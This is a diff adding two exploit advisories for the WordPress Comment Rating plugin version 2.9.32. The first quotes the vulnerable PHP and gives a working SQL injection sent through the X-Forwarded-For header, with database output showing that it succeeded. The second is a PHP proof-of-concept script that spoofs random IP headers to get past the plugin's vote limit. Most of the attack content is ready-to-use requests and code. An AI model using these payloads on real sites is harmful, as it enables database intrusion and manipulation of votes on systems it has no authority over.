@@ -1,0 +1,121 @@
+# Exploit Title: Wordpress plugin: Comment Rating SQL injection
+# Google Dork: 
+# Date: 21/02/2013
+# Exploit Author: ebanyu
+# Url Author: www.ebanyu.com.ar
+# Vendor Homepage: wealthynetizen.com
+# Software Link: http://wealthynetizen.com/wordpress-plugin-comment-rating/
+# Version: 2.9.32
+# Tested on: Fedora 18 + mysql 5.5 + php 5.4
+
+
+
+Vulnerable Code: /wp-content/plugins/comment-rating/ck-processkarma.php
+
+First take the IP from HTTP_X_FORWARDED_FOR header.
+-----------------------------------------------------------------------
+48         $ip = getenv("HTTP_X_FORWARDED_FOR") ? getenv("HTTP_X_FORWARDED_FOR") : getenv("REMOTE_ADDR");
+49         if(strstr($row['ck_ips'], $ip)) {
+50            // die('error|You have already voted on this item!'); 
+51            // Just don't count duplicated votes
+52            $duplicated = 1;
+53            $ck_ips = $row['ck_ips'];
+54         }
+
+Later made a UPDATE without filter the input.
+------------------------------------------------------------------------
+77         $query = "UPDATE `$table_name` SET ck_rating_$direction = '$rating', ck_ips = '" . $ck_ips  . "' WHERE ck_comment_id = $k_id";
+
+
+So let's take a look in the DB
+
+mysql> select * from wp_comment_rating;
++---------------+----------------+--------------+----------------+
+| ck_comment_id | ck_ips         | ck_rating_up | ck_rating_down |
++---------------+----------------+--------------+----------------+
+|             2 | ,20.209.10.130 |            1 |              0 |
+|             3 |                |            0 |              0 |
++---------------+----------------+--------------+----------------+
+2 rows in set (0.00 sec)
+
+
+Now made a HTTP request with a injection in the HTTP_X_FORWARDED_FOR header:
+
+GET /wordpress/wp-content/plugins/comment-rating/ck-processkarma.php?id=2&action=add&path=a&imgIndex=1_14_ HTTP/1.1 
+Host: 192.168.1.10
+Accept-Encoding: gzip, deflate
+X-Forwarded-For: ', ck_ips=(select user()) WHERE ck_comment_id=2#
+Connection: keep-alive
+
+
+And the result is:
+
+mysql> select * from wp_comment_rating;
++---------------+---------------------+--------------+----------------+
+| ck_comment_id | ck_ips              | ck_rating_up | ck_rating_down |
++---------------+---------------------+--------------+----------------+
+|             2 | wordpress@localhost |            2 |              0 |
+|             3 |                     |            0 |              0 |
++---------------+---------------------+--------------+----------------+
+2 rows in set (0.00 sec)
+
+Cheers
+
+=======================================================================================
+
+
+# Exploit Title: Wordpress plugin: Comment Rating Bypass vote limitation
+# Date: 21/02/2013
+# Exploit Author: ebanyu
+# Url Author: www.ebanyu.com.ar
+# Vendor Homepage: wealthynetizen.com
+# Software Link: http://wealthynetizen.com/wordpress-plugin-comment-rating/
+# Version: 2.9.32
+# Tested on: Fedora 18 + mysql 5.5 + php 5.4
+
+
+Vulnerable Code: /wp-content/plugins/comment-rating/ck-processkarma.php
+
+First take the IP from HTTP_X_FORWARDED_FOR header.
+-----------------------------------------------------------------------
+48         $ip = getenv("HTTP_X_FORWARDED_FOR") ? getenv("HTTP_X_FORWARDED_FOR") : getenv("REMOTE_ADDR");
+49         if(strstr($row['ck_ips'], $ip)) {
+50            // die('error|You have already voted on this item!'); 
+51            // Just don't count duplicated votes
+52            $duplicated = 1;
+53            $ck_ips = $row['ck_ips'];
+54         }
+
+Later made a UPDATE without filter the input.
+------------------------------------------------------------------------
+77         $query = "UPDATE `$table_name` SET ck_rating_$direction = '$rating', ck_ips = '" . $ck_ips  . "' WHERE ck_comment_id = $k_id";
+
+
+Now for bypass the vote limitation, we just have to add the HTTP_X_FORWARDED_FOR header and change it once per request.
+
+A simple POC is made in php.
+
+<?PHP
+
+define('HOST','http://localhost/wordpress/');
+define('IDCOMMENT',2);
+$url=parse_url(HOST);
+define('URL',$url['path'].'wp-content/plugins/comment-rating/ck-processkarma.php?id='.IDCOMMENT.'&action=add&path=a&imgIndex=1_14_');
+for($i=0;$i<1;$i++) lvlup();
+
+function lvlup(){
+	global $url;
+	$header = "GET ".URL." HTTP/1.1 \r\n";
+	$header.= "Host: ".$url['host']."\r\n";
+	$header.= "Accept-Encoding: gzip, deflate \r\n";
+	$header.= "X-Forwarded-For: ".long2ip(rand(0, "4294967295"))."\r\n";
+	$header.= "Connection: close \r\n\r\n";
+	$socket  = socket_create(AF_INET, SOCK_STREAM,  SOL_TCP);
+	socket_connect($socket,$url['host'], 80);
+	socket_write($socket, $header);
+	socket_close($socket);
+}
+
+?>
+
+
